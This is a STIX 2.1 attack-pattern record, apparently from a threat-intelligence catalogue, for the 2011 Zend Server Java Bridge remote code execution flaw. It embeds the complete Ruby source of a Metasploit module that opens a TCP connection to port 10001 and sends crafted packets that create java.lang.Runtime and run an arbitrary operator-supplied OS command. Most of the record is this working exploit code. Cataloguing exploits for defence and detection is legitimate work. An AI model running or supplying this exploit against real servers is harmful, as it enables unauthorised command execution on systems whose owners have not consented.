{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e8ebd13d-41f6-4134-b639-f7d78d0681d5",
    "created": "2024-08-14T16:22:21.691042Z",
    "modified": "2024-08-14T16:22:21.691046Z",
    "name": "Zend Server Java Bridge Design Flaw Remote Code Execution",
    "description": " This module abuses a flaw in the Zend Java Bridge Component of the Zend Server Framework. By sending a specially crafted packet, an attacker may be able to execute arbitrary code.  NOTE: This module has only been tested with the Win32 build of the software. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/zend/java_bridge.rb",
            "external_id": "java_bridge.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Zend Server Java Bridge Design Flaw Remote Code Execution',\n      'Description'    => %q{\n          This module abuses a flaw in the Zend Java Bridge Component of\n        the Zend Server Framework. By sending a specially crafted packet, an\n        attacker may be able to execute arbitrary code.\n\n        NOTE: This module has only been tested with the Win32 build of the software.\n      },\n      'Author'         => [ 'ikki', 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '71420'],\n          [ 'ZDI', '11-113' ],\n          [ 'EDB', '17078' ],\n        ],\n      'DisclosureDate' => '2011-03-28'))\n\n    register_options(\n      [\n        Opt::RPORT(10001),\n        OptString.new('CMD', [ false, 'The OS command to execute', 'cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\\\metasploit.txt']),\n      ])\n  end\n\n  def run\n\n    cmd = datastore['CMD']\n\n    connect\n\n    java_object =  [0x33000000].pack('V') + [0x00000000].pack('V')\n    java_object << [0x0c000000].pack('V') + \"CreateObject\"\n    java_object << [0x02000000].pack('V') + [0x00000004].pack('V')\n    java_object << \"\\x11\" + \"java.lang.Runtime\" + \"\\x07\"\n    java_object << [0x00000000].pack('V')\n\n    print_status(\"Creating the Java Object 'java.lang.Runtime'\")\n    sock.put(java_object)\n    res = sock.get_once() || ''\n    classid = res[5,4]\n\n    runtime =  [0x16000000].pack('V') + classid + [0x0a000000].pack('V')\n    runtime << \"getRuntime\" + [0x00000000].pack('V')\n\n    print_status(\"Invoking static method 'getRuntime()'\")\n    sock.put(runtime)\n    res = sock.get_once() || ''\n    methodid = res[5,4]\n\n    exec =  [0x00].pack('n') + [21 + cmd.length].pack('n') + methodid\n    exec << [0x04000000].pack('V') + \"exec\" + [0x01000000].pack('V')\n    exec << \"\\x04\" + [0x00].pack('n') + [cmd.length].pack('n') + cmd\n\n    print_status(\"Invoking method 'exec()' with parameter '#{cmd}'\")\n    sock.put(exec)\n    success = sock.get_once() || ''\n    if (success =~ /\\x00\\x00\\x00/)\n      print_status(\"Cleaning up the JVM\")\n      rm =  [0x11000000].pack('V') + [0xffffffff].pack('V')\n      rm << [0x05000000].pack('V') + \"reset\"\n      rm << [0x00000000].pack('V')\n      sock.put(rm)\n    else\n      print_error(\"Failed to run command...\")\n      disconnect\n      return\n    end\n\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-03-28"
}